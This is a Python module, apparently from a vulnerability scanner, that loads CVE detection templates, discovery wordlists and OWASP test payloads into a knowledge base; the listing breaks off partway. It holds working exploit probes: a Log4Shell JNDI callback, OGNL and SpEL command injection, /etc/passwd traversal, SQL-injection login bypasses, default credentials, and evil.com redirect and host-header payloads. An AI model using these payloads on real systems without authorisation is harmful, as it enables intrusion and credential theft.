"""
Community Knowledge & Adversarial Self-Testing modules for Phantom's AI.

Module 1: Community Knowledge Sync
  - Nuclei template detection patterns (50+)
  - SecLists/FuzzDB discovery patterns (40+)
  - OWASP testing guide payloads (30+)

Module 2: Adversarial Self-Testing Knowledge
  - Scanner evasion techniques (20+)
  - Scanner blind spots (15+)

Injects curated knowledge from public security tool databases and adversarial
testing patterns so Phantom understands both what to look for and what scanners
commonly miss.
"""
import logging
from datetime import datetime

from sqlalchemy import select
from sqlalchemy.ext.asyncio import AsyncSession

from app.models.knowledge import KnowledgePattern

logger = logging.getLogger(__name__)


# ---------------------------------------------------------------------------
# Shared dedup + insert helper (same pattern as knowledge_injection.py)
# ---------------------------------------------------------------------------

async def _inject_patterns(db: AsyncSession, all_patterns: list[dict]) -> dict:
    """Insert patterns with dedup by pattern_type + technology + vuln_type + key."""
    stats = {"created": 0, "skipped": 0, "categories": {}}

    for p in all_patterns:
        key = p["pattern_data"].get("key", "")
        existing = await db.execute(
            select(KnowledgePattern).where(
                KnowledgePattern.pattern_type == p["pattern_type"],
                KnowledgePattern.technology == p.get("technology"),
                KnowledgePattern.vuln_type == p.get("vuln_type"),
            ).limit(1)
        )

        # More specific dedup when a key is present
        if key:
            existing = await db.execute(
                select(KnowledgePattern).where(
                    KnowledgePattern.pattern_type == p["pattern_type"],
                    KnowledgePattern.vuln_type == p.get("vuln_type"),
                    KnowledgePattern.pattern_data["key"].as_string() == key,
                ).limit(1)
            )

        if existing.scalar_one_or_none():
            stats["skipped"] += 1
            continue

        record = KnowledgePattern(
            pattern_type=p["pattern_type"],
            technology=p.get("technology"),
            vuln_type=p.get("vuln_type"),
            pattern_data=p["pattern_data"],
            confidence=p.get("confidence", 0.9),
            sample_count=p.get("sample_count", 100),
        )
        db.add(record)
        stats["created"] += 1

        cat = p["pattern_type"]
        stats["categories"][cat] = stats["categories"].get(cat, 0) + 1

    await db.commit()
    return stats


# ===================================================================
# MODULE 1: Community Knowledge Sync
# ===================================================================

async def inject_community_knowledge(db: AsyncSession) -> dict:
    """Inject curated knowledge from public security tool databases."""
    all_patterns = []
    all_patterns.extend(_nuclei_template_knowledge())
    all_patterns.extend(_seclists_fuzzdb_patterns())
    all_patterns.extend(_owasp_payloads())

    stats = await _inject_patterns(db, all_patterns)
    logger.info(
        f"Community knowledge injection: {stats['created']} created, "
        f"{stats['skipped']} skipped"
    )
    return stats


# ===================================================================
# MODULE 2: Adversarial Self-Testing Knowledge
# ===================================================================

async def inject_adversarial_knowledge(db: AsyncSession) -> dict:
    """Inject knowledge about scanner evasion and blind spots."""
    all_patterns = []
    all_patterns.extend(_scanner_evasion_techniques())
    all_patterns.extend(_scanner_blind_spots())

    stats = await _inject_patterns(db, all_patterns)
    logger.info(
        f"Adversarial knowledge injection: {stats['created']} created, "
        f"{stats['skipped']} skipped"
    )
    return stats


# ===================================================================
# A. Nuclei Template Knowledge (50+ templates)
# ===================================================================

def _nuclei_template_knowledge() -> list[dict]:
    templates = [
        # --- CVE Templates (20) ---
        {
            "template_id": "CVE-2021-44228",
            "name": "Log4j RCE (Log4Shell)",
            "severity": "critical",
            "matchers": [{"type": "dsl", "condition": "contains(body, 'jndi')"}],
            "paths": ["/"],
            "method": "GET",
            "headers": {"X-Api-Version": "${jndi:ldap://{{interactsh-url}}}"},
            "description": "Apache Log4j2 JNDI RCE via crafted headers",
        },
        {
            "template_id": "CVE-2021-41773",
            "name": "Apache Path Traversal",
            "severity": "critical",
            "matchers": [{"type": "status", "status": [200]}, {"type": "word", "words": ["root:x:"]}],
            "paths": ["/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd"],
            "method": "GET",
            "description": "Apache HTTP Server 2.4.49 path traversal and RCE",
        },
        {
            "template_id": "CVE-2023-22515",
            "name": "Confluence Broken Access Control",
            "severity": "critical",
            "matchers": [{"type": "status", "status": [200]}, {"type": "word", "words": ["setup-restore"]}],
            "paths": ["/server-info.action?bootstrapStatusProvider.applicationConfig.setupComplete=false"],
            "method": "GET",
            "description": "Atlassian Confluence privilege escalation via setup endpoint",
        },
        {
            "template_id": "CVE-2023-34362",
            "name": "MOVEit Transfer SQLi",
            "severity": "critical",
            "matchers": [{"type": "status", "status": [200]}, {"type": "word", "words": ["MOVEit"]}],
            "paths": ["/moveitisapi/moveitisapi.dll?action=m2", "/guestaccess.aspx"],
            "method": "GET",
            "description": "Progress MOVEit Transfer SQL injection leading to RCE",
        },
        {
            "template_id": "CVE-2023-46747",
            "name": "F5 BIG-IP Auth Bypass",
            "severity": "critical",
            "matchers": [{"type": "status", "status": [200]}, {"type": "word", "words": ["tmui"]}],
            "paths": ["/tmui/login.jsp"],
            "method": "GET",
            "description": "F5 BIG-IP unauthenticated remote code execution",
        },
        {
            "template_id": "CVE-2024-3400",
            "name": "PAN-OS GlobalProtect Command Injection",
            "severity": "critical",
            "matchers": [{"type": "status", "status": [200]}],
            "paths": ["/global-protect/portal/css/login.css"],
            "method": "POST",
            "description": "Palo Alto Networks PAN-OS command injection via GlobalProtect",
        },
        {
            "template_id": "CVE-2021-26855",
            "name": "ProxyLogon Exchange SSRF",
            "severity": "critical",
            "matchers": [{"type": "status", "status": [200]}, {"type": "word", "words": ["X-CalculatedBETarget"]}],
            "paths": ["/owa/auth/x.js"],
            "method": "GET",
            "headers": {"Cookie": "X-AnonResource=true; X-AnonResource-Backend=localhost/ecp/default.flt"},
            "description": "Microsoft Exchange Server SSRF to RCE (ProxyLogon)",
        },
        {
            "template_id": "CVE-2022-22963",
            "name": "Spring Cloud Function SpEL Injection",
            "severity": "critical",
            "matchers": [{"type": "status", "status": [500]}, {"type": "word", "words": ["error"]}],
            "paths": ["/functionRouter"],
            "method": "POST",
            "headers": {"spring.cloud.function.routing-expression": "T(java.lang.Runtime).getRuntime().exec('id')"},
            "description": "Spring Cloud Function RCE via SpEL injection",
        },
        {
            "template_id": "CVE-2022-1388",
            "name": "F5 BIG-IP iControl REST Auth Bypass",
            "severity": "critical",
            "matchers": [{"type": "status", "status": [200]}, {"type": "word", "words": ["commandResult"]}],
            "paths": ["/mgmt/tm/util/bash"],
            "method": "POST",
            "headers": {"Connection": "X-F5-Auth-Token, keep-alive", "X-F5-Auth-Token": ""},
            "description": "F5 BIG-IP iControl REST authentication bypass",
        },
        {
            "template_id": "CVE-2023-27997",
            "name": "FortiOS SSL-VPN Heap Overflow",
            "severity": "critical",
            "matchers": [{"type": "status", "status": [200]}, {"type": "word", "words": ["vpn"]}],
            "paths": ["/remote/logincheck"],
            "method": "GET",
            "description": "Fortinet FortiOS SSL-VPN pre-auth heap overflow RCE",
        },
        {
            "template_id": "CVE-2021-22205",
            "name": "GitLab CE/EE RCE via EXIF",
            "severity": "critical",
            "matchers": [{"type": "status", "status": [422]}, {"type": "word", "words": ["error"]}],
            "paths": ["/uploads/user"],
            "method": "POST",
            "description": "GitLab unauthenticated RCE via EXIF metadata in image upload",
        },
        {
            "template_id": "CVE-2022-41040",
            "name": "Exchange ProxyNotShell SSRF",
            "severity": "high",
            "matchers": [{"type": "status", "status": [302]}, {"type": "word", "words": ["autodiscover"]}],
            "paths": ["/autodiscover/autodiscover.json?@evil.com/owa/"],
            "method": "GET",
            "description": "Microsoft Exchange ProxyNotShell SSRF chain",
        },
        {
            "template_id": "CVE-2023-44487",
            "name": "HTTP/2 Rapid Reset DoS",
            "severity": "high",
            "matchers": [{"type": "dsl", "condition": "protocol == 'h2'"}],
            "paths": ["/"],
            "method": "GET",
            "description": "HTTP/2 rapid reset attack causing denial of service",
        },
        {
            "template_id": "CVE-2021-3129",
            "name": "Laravel Ignition RCE",
            "severity": "critical",
            "matchers": [{"type": "status", "status": [200]}, {"type": "word", "words": ["Ignition"]}],
            "paths": ["/_ignition/execute-solution"],
            "method": "POST",
            "description": "Laravel Ignition debug mode RCE via phar deserialization",
        },
        {
            "template_id": "CVE-2022-22947",
            "name": "Spring Cloud Gateway Code Injection",
            "severity": "critical",
            "matchers": [{"type": "status", "status": [201]}],
            "paths": ["/actuator/gateway/routes"],
            "method": "POST",
            "description": "Spring Cloud Gateway RCE via SpEL code injection in routes",
        },
        {
            "template_id": "CVE-2021-21972",
            "name": "VMware vCenter Server RCE",
            "severity": "critical",
            "matchers": [{"type": "status", "status": [200]}, {"type": "word", "words": ["VMware"]}],
            "paths": ["/ui/vropspluginui/rest/services/uploadova"],
            "method": "GET",
            "description": "VMware vCenter Server unauthenticated file upload to RCE",
        },
        {
            "template_id": "CVE-2023-0669",
            "name": "GoAnywhere MFT RCE",
            "severity": "critical",
            "matchers": [{"type": "status", "status": [200]}],
            "paths": ["/goanywhere/lic/accept"],
            "method": "POST",
            "description": "Fortra GoAnywhere MFT pre-auth deserialization RCE",
        },
        {
            "template_id": "CVE-2024-21887",
            "name": "Ivanti Connect Secure Command Injection",
            "severity": "critical",
            "matchers": [{"type": "status", "status": [200]}],
            "paths": ["/api/v1/totp/user-backup-code/../../system/maintenance/archiving/cloud-server-test-connection"],
            "method": "GET",
            "description": "Ivanti Connect Secure/Policy Secure command injection",
        },
        {
            "template_id": "CVE-2023-42793",
            "name": "JetBrains TeamCity Auth Bypass",
            "severity": "critical",
            "matchers": [{"type": "status", "status": [200]}, {"type": "word", "words": ["token"]}],
            "paths": ["/app/rest/users/id:1/tokens/RPC2"],
            "method": "POST",
            "description": "JetBrains TeamCity authentication bypass to admin token creation",
        },
        {
            "template_id": "CVE-2022-26134",
            "name": "Confluence OGNL Injection",
            "severity": "critical",
            "matchers": [{"type": "status", "status": [200]}],
            "paths": ["/%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%27id%27%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/"],
            "method": "GET",
            "description": "Atlassian Confluence OGNL injection RCE",
        },
        # --- Exposure Templates (12) ---
        {
            "template_id": "exposure-env-file",
            "name": "Environment File Exposure",
            "severity": "high",
            "matchers": [{"type": "word", "words": ["DB_PASSWORD", "DB_HOST", "APP_KEY", "SECRET_KEY"]}],
            "paths": ["/.env", "/.env.production", "/.env.local", "/.env.backup"],
            "method": "GET",
            "description": "Exposed .env file containing secrets and credentials",
        },
        {
            "template_id": "exposure-git-config",
            "name": "Git Config Exposure",
            "severity": "medium",
            "matchers": [{"type": "word", "words": ["[core]", "[remote"]}],
            "paths": ["/.git/config", "/.git/HEAD", "/.git/index"],
            "method": "GET",
            "description": "Exposed .git directory allowing source code extraction",
        },
        {
            "template_id": "exposure-debug-endpoint",
            "name": "Debug Endpoint Exposure",
            "severity": "high",
            "matchers": [{"type": "word", "words": ["DEBUG", "Traceback", "stack trace", "phpinfo"]}],
            "paths": ["/debug", "/debug/vars", "/debug/pprof", "/_debug", "/phpinfo.php", "/info.php"],
            "method": "GET",
            "description": "Exposed debug endpoints revealing internal application state",
        },
        {
            "template_id": "exposure-backup-files",
            "name": "Backup File Exposure",
            "severity": "medium",
            "matchers": [{"type": "status", "status": [200]}, {"type": "word", "words": ["<?php", "import ", "server {"]}],
            "paths": ["/backup.sql", "/db.sql", "/dump.sql", "/backup.tar.gz", "/backup.zip", "/site.tar.gz"],
            "method": "GET",
            "description": "Exposed backup files containing source code or database dumps",
        },
        {
            "template_id": "exposure-ds-store",
            "name": "DS_Store File Exposure",
            "severity": "low",
            "matchers": [{"type": "binary", "binary": ["0000000142756431"]}],
            "paths": ["/.DS_Store"],
            "method": "GET",
            "description": "Exposed macOS .DS_Store file revealing directory listing",
        },
        {
            "template_id": "exposure-svn",
            "name": "SVN Directory Exposure",
            "severity": "medium",
            "matchers": [{"type": "word", "words": ["svn:wc:ra_dav"]}],
            "paths": ["/.svn/entries", "/.svn/wc.db"],
            "method": "GET",
            "description": "Exposed SVN directory allowing source code extraction",
        },
        {
            "template_id": "exposure-wp-config",
            "name": "WordPress Config Exposure",
            "severity": "critical",
            "matchers": [{"type": "word", "words": ["DB_NAME", "DB_USER", "DB_PASSWORD"]}],
            "paths": ["/wp-config.php.bak", "/wp-config.php.old", "/wp-config.php~", "/wp-config.php.save"],
            "method": "GET",
            "description": "Exposed WordPress config with database credentials",
        },
        {
            "template_id": "exposure-server-status",
            "name": "Apache Server Status Exposure",
            "severity": "medium",
            "matchers": [{"type": "word", "words": ["Apache Server Status", "Server uptime"]}],
            "paths": ["/server-status", "/server-info"],
            "method": "GET",
            "description": "Exposed Apache server-status page with request info",
        },
        {
            "template_id": "exposure-actuator",
            "name": "Spring Boot Actuator Exposure",
            "severity": "high",
            "matchers": [{"type": "word", "words": ["beans", "health", "env", "mappings"]}],
            "paths": ["/actuator", "/actuator/env", "/actuator/health", "/actuator/beans", "/actuator/mappings", "/actuator/configprops"],
            "method": "GET",
            "description": "Exposed Spring Boot Actuator endpoints leaking config and env",
        },
        {
            "template_id": "exposure-docker",
            "name": "Docker API Exposure",
            "severity": "critical",
            "matchers": [{"type": "word", "words": ["Containers", "Images", "ApiVersion"]}],
            "paths": ["/v1.24/containers/json", "/version", "/_ping"],
            "method": "GET",
            "description": "Exposed Docker daemon API allowing container management",
        },
        {
            "template_id": "exposure-graphql-introspection",
            "name": "GraphQL Introspection Enabled",
            "severity": "medium",
            "matchers": [{"type": "word", "words": ["__schema", "__type", "queryType"]}],
            "paths": ["/graphql", "/graphql/console", "/graphiql"],
            "method": "POST",
            "description": "GraphQL introspection enabled exposing full schema",
        },
        {
            "template_id": "exposure-swagger",
            "name": "Swagger/OpenAPI Exposure",
            "severity": "low",
            "matchers": [{"type": "word", "words": ["swagger", "openapi", "paths"]}],
            "paths": ["/swagger-ui.html", "/swagger.json", "/openapi.json", "/api-docs", "/v2/api-docs", "/v3/api-docs"],
            "method": "GET",
            "description": "Exposed Swagger/OpenAPI documentation revealing API surface",
        },
        # --- Misconfiguration Templates (10) ---
        {
            "template_id": "misconfig-cors-wildcard",
            "name": "CORS Wildcard Misconfiguration",
            "severity": "medium",
            "matchers": [{"type": "header", "headers": {"Access-Control-Allow-Origin": "*"}}],
            "paths": ["/api/", "/"],
            "method": "GET",
            "headers": {"Origin": "https://evil.com"},
            "description": "CORS misconfiguration allowing any origin to read responses",
        },
        {
            "template_id": "misconfig-cors-reflect",
            "name": "CORS Origin Reflection",
            "severity": "high",
            "matchers": [{"type": "header", "headers": {"Access-Control-Allow-Origin": "https://evil.com", "Access-Control-Allow-Credentials": "true"}}],
            "paths": ["/api/", "/"],
            "method": "GET",
            "headers": {"Origin": "https://evil.com"},
            "description": "CORS reflecting arbitrary origin with credentials allowed",
        },
        {
            "template_id": "misconfig-crlf-injection",
            "name": "CRLF Injection",
            "severity": "medium",
            "matchers": [{"type": "header", "headers": {"X-Injected": "true"}}],
            "paths": ["/%0d%0aX-Injected:%20true", "/path%0d%0aSet-Cookie:%20evil=1"],
            "method": "GET",
            "description": "CRLF injection allowing HTTP response splitting",
        },
        {
            "template_id": "misconfig-host-header",
            "name": "Host Header Injection",
            "severity": "medium",
            "matchers": [{"type": "word", "words": ["evil.com"]}],
            "paths": ["/", "/password-reset"],
            "method": "GET",
            "headers": {"Host": "evil.com", "X-Forwarded-Host": "evil.com"},
            "description": "Host header injection for cache poisoning or password reset hijack",
        },
        {
            "template_id": "misconfig-open-redirect",
            "name": "Open Redirect",
            "severity": "medium",
            "matchers": [{"type": "status", "status": [301, 302, 307, 308]}, {"type": "header", "headers": {"Location": "https://evil.com"}}],
            "paths": ["/redirect?url=https://evil.com", "/login?next=https://evil.com", "/out?to=https://evil.com", "/go?r=https://evil.com"],
            "method": "GET",
            "description": "Open redirect allowing phishing via trusted domain",
        },
        {
            "template_id": "misconfig-security-headers",
            "name": "Missing Security Headers",
            "severity": "info",
            "matchers": [{"type": "negative_header", "headers": ["X-Frame-Options", "Content-Security-Policy", "X-Content-Type-Options", "Strict-Transport-Security"]}],
            "paths": ["/"],
            "method": "GET",
            "description": "Missing security headers (XFO, CSP, XCTO, HSTS)",
        },
        {
            "template_id": "misconfig-directory-listing",
            "name": "Directory Listing Enabled",
            "severity": "low",
            "matchers": [{"type": "word", "words": ["Index of /", "Directory listing for", "Parent Directory"]}],
            "paths": ["/", "/images/", "/uploads/", "/static/", "/assets/", "/files/"],
            "method": "GET",
            "description": "Directory listing enabled exposing file structure",
        },
        {
            "template_id": "misconfig-http-methods",
            "name": "Dangerous HTTP Methods Allowed",
            "severity": "medium",
            "matchers": [{"type": "word", "words": ["PUT", "DELETE", "TRACE", "CONNECT"]}],
            "paths": ["/"],
            "method": "OPTIONS",
            "description": "Dangerous HTTP methods (PUT, DELETE, TRACE) allowed",
        },
        {
            "template_id": "misconfig-cookie-flags",
            "name": "Insecure Cookie Flags",
            "severity": "low",
            "matchers": [{"type": "negative_header_value", "header": "Set-Cookie", "absent": ["Secure", "HttpOnly", "SameSite"]}],
            "paths": ["/login"],
            "method": "POST",
            "description": "Session cookies missing Secure, HttpOnly, or SameSite flags",
        },
        {
            "template_id": "misconfig-clickjacking",
            "name": "Clickjacking via Missing X-Frame-Options",
            "severity": "medium",
            "matchers": [{"type": "negative_header", "headers": ["X-Frame-Options", "Content-Security-Policy"]}],
            "paths": ["/", "/login", "/account"],
            "method": "GET",
            "description": "Page can be framed due to missing X-Frame-Options or CSP frame-ancestors",
        },
        # --- Technology Templates (10) ---
        {
            "template_id": "tech-detect-wordpress",
            "name": "WordPress Detection",
            "severity": "info",
            "matchers": [{"type": "word", "words": ["wp-content", "wp-includes", "WordPress"]}],
            "paths": ["/", "/wp-login.php", "/wp-admin/", "/xmlrpc.php"],
            "method": "GET",
            "description": "WordPress CMS detection and version fingerprinting",
        },
        {
            "template_id": "tech-detect-drupal",
            "name": "Drupal Detection",
            "severity": "info",
            "matchers": [{"type": "word", "words": ["Drupal", "sites/default", "X-Generator: Drupal"]}],
            "paths": ["/", "/CHANGELOG.txt", "/core/CHANGELOG.txt"],
            "method": "GET",
            "description": "Drupal CMS detection and version fingerprinting",
        },
        {
            "template_id": "tech-detect-joomla",
            "name": "Joomla Detection",
            "severity": "info",
            "matchers": [{"type": "word", "words": ["Joomla", "/administrator/", "com_content"]}],
            "paths": ["/", "/administrator/manifests/files/joomla.xml"],
            "method": "GET",
            "description": "Joomla CMS detection and version fingerprinting",
        },
        {
            "template_id": "tech-detect-nginx",
            "name": "Nginx Version Detection",
            "severity": "info",
            "matchers": [{"type": "header", "headers": {"Server": "nginx/"}}],
            "paths": ["/"],
            "method": "GET",
            "description": "Nginx web server version detection via Server header",
        },
        {
            "template_id": "tech-detect-apache",
            "name": "Apache Version Detection",
            "severity": "info",
            "matchers": [{"type": "header", "headers": {"Server": "Apache/"}}],
            "paths": ["/"],
            "method": "GET",
            "description": "Apache web server version detection via Server header",
        },
        {
            "template_id": "tech-detect-iis",
            "name": "IIS Version Detection",
            "severity": "info",
            "matchers": [{"type": "header", "headers": {"Server": "Microsoft-IIS/"}}],
            "paths": ["/"],
            "method": "GET",
            "description": "Microsoft IIS web server version detection",
        },
        {
            "template_id": "tech-detect-php",
            "name": "PHP Version Detection",
            "severity": "info",
            "matchers": [{"type": "header", "headers": {"X-Powered-By": "PHP/"}}],
            "paths": ["/"],
            "method": "GET",
            "description": "PHP version detection via X-Powered-By header",
        },
        {
            "template_id": "tech-detect-aspnet",
            "name": "ASP.NET Detection",
            "severity": "info",
            "matchers": [{"type": "header", "headers": {"X-Powered-By": "ASP.NET", "X-AspNet-Version": ""}}],
            "paths": ["/"],
            "method": "GET",
            "description": "ASP.NET framework detection and version fingerprinting",
        },
        {
            "template_id": "tech-detect-nodejs",
            "name": "Node.js/Express Detection",
            "severity": "info",
            "matchers": [{"type": "header", "headers": {"X-Powered-By": "Express"}}],
            "paths": ["/"],
            "method": "GET",
            "description": "Node.js/Express framework detection via headers",
        },
        {
            "template_id": "tech-detect-django",
            "name": "Django Detection",
            "severity": "info",
            "matchers": [{"type": "word", "words": ["csrfmiddlewaretoken", "django", "__debug__"]}],
            "paths": ["/", "/admin/"],
            "method": "GET",
            "description": "Django framework detection via CSRF token and admin panel",
        },
    ]

    return [
        {
            "pattern_type": "nuclei_template",
            "technology": t.get("template_id", "").split("-")[0] if "tech-detect" in t.get("template_id", "") else None,
            "vuln_type": None,
            "pattern_data": {
                "key": t["template_id"],
                "template_id": t["template_id"],
                "name": t["name"],
                "severity": t["severity"],
                "matchers": t["matchers"],
                "paths": t["paths"],
                "method": t.get("method", "GET"),
                "description": t["description"],
                **({"headers": t["headers"]} if "headers" in t else {}),
            },
            "confidence": 0.95 if t["severity"] in ("critical", "high") else 0.85,
            "sample_count": 200,
        }
        for t in templates
    ]


# ===================================================================
# B. SecLists / FuzzDB Patterns (40+ wordlists)
# ===================================================================

def _seclists_fuzzdb_patterns() -> list[dict]:
    patterns = [
        # Admin paths (8)
        {
            "category": "admin",
            "paths": ["/admin", "/administrator", "/admin/login", "/admin/dashboard"],
            "description": "Common admin panel paths - primary",
            "priority": "high",
        },
        {
            "category": "admin",
            "paths": ["/wp-admin", "/wp-login.php", "/wp-admin/admin-ajax.php"],
            "description": "WordPress admin paths",
            "priority": "high",
        },
        {
            "category": "admin",
            "paths": ["/phpmyadmin", "/pma", "/mysql", "/adminer", "/adminer.php"],
            "description": "Database management interfaces",
            "priority": "high",
        },
        {
            "category": "admin",
            "paths": ["/cpanel", "/webmail", "/whm", "/plesk"],
            "description": "Hosting control panel paths",
            "priority": "medium",
        },
        {
            "category": "admin",
            "paths": ["/manager/html", "/manager/status", "/host-manager/html"],
            "description": "Apache Tomcat manager paths",
            "priority": "high",
        },
        {
            "category": "admin",
            "paths": ["/jenkins", "/hudson", "/ci", "/bamboo"],
            "description": "CI/CD administration paths",
            "priority": "high",
        },
        {
            "category": "admin",
            "paths": ["/solr/admin", "/kibana", "/grafana", "/prometheus"],
            "description": "Monitoring and search admin panels",
            "priority": "medium",
        },
        {
            "category": "admin",
            "paths": ["/console", "/jmx-console", "/web-console", "/admin-console"],
            "description": "Application server consoles",
            "priority": "high",
        },
        # API paths (7)
        {
            "category": "api",
            "paths": ["/api", "/api/v1", "/api/v2", "/api/v3", "/rest", "/rest/api"],
            "description": "Common REST API base paths",
            "priority": "high",
        },
        {
            "category": "api",
            "paths": ["/graphql", "/graphiql", "/graphql/console", "/playground"],
            "description": "GraphQL endpoints",
            "priority": "high",
        },
        {
            "category": "api",
            "paths": ["/swagger", "/swagger-ui.html", "/swagger.json", "/swagger-resources"],
            "description": "Swagger/OpenAPI documentation",
            "priority": "high",
        },
        {
            "category": "api",
            "paths": ["/openapi.json", "/openapi.yaml", "/api-docs", "/v2/api-docs", "/v3/api-docs"],
            "description": "OpenAPI specification files",
            "priority": "medium",
        },
        {
            "category": "api",
            "paths": ["/api/users", "/api/user", "/api/account", "/api/profile", "/api/me"],
            "description": "Common user-related API endpoints",
            "priority": "high",
        },
        {
            "category": "api",
            "paths": ["/api/config", "/api/settings", "/api/admin", "/api/internal"],
            "description": "Internal/admin API endpoints",
            "priority": "high",
        },
        {
            "category": "api",
            "paths": ["/ws", "/websocket", "/socket.io", "/sockjs", "/realtime"],
            "description": "WebSocket and real-time endpoints",
            "priority": "medium",
        },
        # Sensitive files (6)
        {
            "category": "sensitive",
            "paths": ["/.env", "/.env.production", "/.env.staging", "/.env.local", "/.env.development"],
            "description": "Environment files with secrets",
            "priority": "high",
        },
        {
            "category": "sensitive",
            "paths": ["/.git/HEAD", "/.git/config", "/.gitignore", "/.git/index"],
            "description": "Git repository files",
            "priority": "high",
        },
        {
            "category": "sensitive",
            "paths": ["/.svn/entries", "/.svn/wc.db", "/.hg/store", "/.bzr/README"],
            "description": "Version control system files",
            "priority": "medium",
        },
        {
            "category": "sensitive",
            "paths": ["/.DS_Store", "/Thumbs.db", "/desktop.ini"],
            "description": "OS metadata files",
            "priority": "low",
        },
        {
            "category": "sensitive",
            "paths": ["/robots.txt", "/sitemap.xml", "/sitemap_index.xml", "/crossdomain.xml", "/clientaccesspolicy.xml"],
            "description": "Web metadata and policy files",
            "priority": "medium",
        },
        {
            "category": "sensitive",
            "paths": ["/id_rsa", "/id_dsa", "/.ssh/authorized_keys", "/.ssh/id_rsa"],
            "description": "SSH keys and credentials",
            "priority": "high",
        },
        # Backup patterns (4)
        {
            "category": "backup",
            "paths": ["/backup.sql", "/db.sql", "/dump.sql", "/database.sql", "/data.sql", "/mysql.sql"],
            "description": "Database dump backup files",
            "priority": "high",
        },
        {
            "category": "backup",
            "paths": ["/backup.tar.gz", "/backup.zip", "/site.tar.gz", "/www.zip", "/html.tar.gz"],
            "description": "Site archive backup files",
            "priority": "high",
        },
        {
            "category": "backup",
            "paths": ["/index.php.bak", "/index.php.old", "/config.php.bak", "/web.config.bak"],
            "description": "Backup copies of config/index files (.bak, .old)",
            "priority": "medium",
        },
        {
            "category": "backup",
            "paths": ["/index.php~", "/config.php.swp", "/config.php.save", "/.config.php.swo"],
            "description": "Editor swap/temp files (~, .swp, .save)",
            "priority": "medium",
        },
        # Config files (5)
        {
            "category": "config",
            "paths": ["/wp-config.php", "/configuration.php", "/config.php", "/settings.php", "/local.php"],
            "description": "CMS configuration files",
            "priority": "high",
        },
        {
            "category": "config",
            "paths": ["/settings.py", "/local_settings.py", "/config.py", "/secrets.py"],
            "description": "Python framework config files",
            "priority": "high",
        },
        {
            "category": "config",
            "paths": ["/application.yml", "/application.properties", "/application-dev.yml", "/bootstrap.yml"],
            "description": "Java/Spring configuration files",
            "priority": "high",
        },
        {
            "category": "config",
            "paths": ["/.htaccess", "/.htpasswd", "/nginx.conf", "/httpd.conf"],
            "description": "Web server configuration files",
            "priority": "high",
        },
        {
            "category": "config",
            "paths": ["/web.config", "/appsettings.json", "/appsettings.Development.json", "/connectionStrings.config"],
            "description": ".NET configuration files",
            "priority": "high",
        },
        # Debug endpoints (5)
        {
            "category": "debug",
            "paths": ["/debug", "/debug/vars", "/debug/pprof", "/debug/pprof/goroutine"],
            "description": "Go debug/pprof endpoints",
            "priority": "high",
        },
        {
            "category": "debug",
            "paths": ["/trace", "/_trace", "/trace.axd", "/elmah.axd"],
            "description": "Request trace and error log endpoints",
            "priority": "high",
        },
        {
            "category": "debug",
            "paths": ["/status", "/health", "/healthz", "/ready", "/readiness", "/liveness"],
            "description": "Health check and status endpoints",
            "priority": "low",
        },
        {
            "category": "debug",
            "paths": ["/metrics", "/prometheus", "/stats", "/statistics"],
            "description": "Metrics and monitoring endpoints",
            "priority": "medium",
        },
        {
            "category": "debug",
            "paths": ["/info", "/env", "/dump", "/heapdump", "/threaddump", "/logfile"],
            "description": "Spring Boot Actuator debug endpoints",
            "priority": "high",
        },
        # Common parameters (5)
        {
            "category": "params",
            "paths": ["id", "user_id", "account_id", "uid", "pid", "item_id", "order_id"],
            "description": "IDOR-prone identifier parameters",
            "priority": "high",
        },
        {
            "category": "params",
            "paths": ["file", "path", "filepath", "filename", "document", "folder", "root", "pg"],
            "description": "Path traversal / LFI-prone parameters",
            "priority": "high",
        },
        {
            "category": "params",
            "paths": ["url", "redirect", "next", "return", "returnUrl", "callback", "ref", "dest", "continue", "goto"],
            "description": "Open redirect and SSRF-prone parameters",
            "priority": "high",
        },
        {
            "category": "params",
            "paths": ["q", "search", "query", "keyword", "term", "find", "s"],
            "description": "Search/XSS-prone parameters",
            "priority": "medium",
        },
        {
            "category": "params",
            "paths": ["cmd", "exec", "command", "execute", "ping", "run", "system", "process"],
            "description": "Command injection-prone parameters",
            "priority": "high",
        },
    ]

    return [
        {
            "pattern_type": "discovery_pattern",
            "technology": None,
            "vuln_type": None,
            "pattern_data": {
                "key": f"discovery_{p['category']}_{i}",
                "category": p["category"],
                "paths": p["paths"],
                "description": p["description"],
                "priority": p["priority"],
            },
            "confidence": 0.9 if p["priority"] == "high" else 0.75,
            "sample_count": 150,
        }
        for i, p in enumerate(patterns)
    ]


# ===================================================================
# C. OWASP Payloads (30+)
# ===================================================================

def _owasp_payloads() -> list[dict]:
    tests = [
        # Authentication bypass (6)
        {
            "test_id": "OTG-AUTHN-001",
            "name": "Default Credentials Testing",
            "category": "authentication",
            "test_steps": ["Identify login form", "Try default credential pairs", "Check for lockout"],
            "payloads": ["admin:admin", "admin:password", "admin:123456", "root:root", "test:test", "admin:changeme", "user:user", "guest:guest"],
            "expected_vulnerable": "Login succeeds with default credentials",
            "expected_secure": "All default credentials rejected, account lockout after N attempts",
        },
        {
            "test_id": "OTG-AUTHN-002",
            "name": "Authentication Bypass via SQL Injection",
            "category": "authentication",
            "test_steps": ["Identify login form", "Inject SQLi payloads in username/password", "Check for auth bypass"],
            "payloads": ["' OR '1'='1", "admin'--", "' OR 1=1--", "admin' #", "') OR ('1'='1", "' UNION SELECT 1,1--"],
            "expected_vulnerable": "Login succeeds without valid credentials",
            "expected_secure": "Input sanitized, parameterized queries used",
        },
        {
            "test_id": "OTG-AUTHN-003",
            "name": "Brute Force Resistance",
            "category": "authentication",
            "test_steps": ["Send 10+ rapid login attempts", "Check for lockout/CAPTCHA", "Test lockout bypass"],
            "payloads": [],
            "expected_vulnerable": "No rate limiting or lockout mechanism",
            "expected_secure": "Account lockout after 3-5 failed attempts or CAPTCHA challenge",
        },
        {
            "test_id": "OTG-AUTHN-004",
            "name": "Password Reset Poisoning",
            "category": "authentication",
            "test_steps": ["Intercept password reset request", "Modify Host header", "Check reset link domain"],
            "payloads": ["Host: evil.com", "X-Forwarded-Host: evil.com", "Host: target.com\r\nHost: evil.com"],
            "expected_vulnerable": "Reset link contains attacker-controlled domain",
            "expected_secure": "Reset link uses hardcoded/configured domain, ignores Host header",
        },
        {
            "test_id": "OTG-AUTHN-005",
            "name": "Multi-Factor Authentication Bypass",
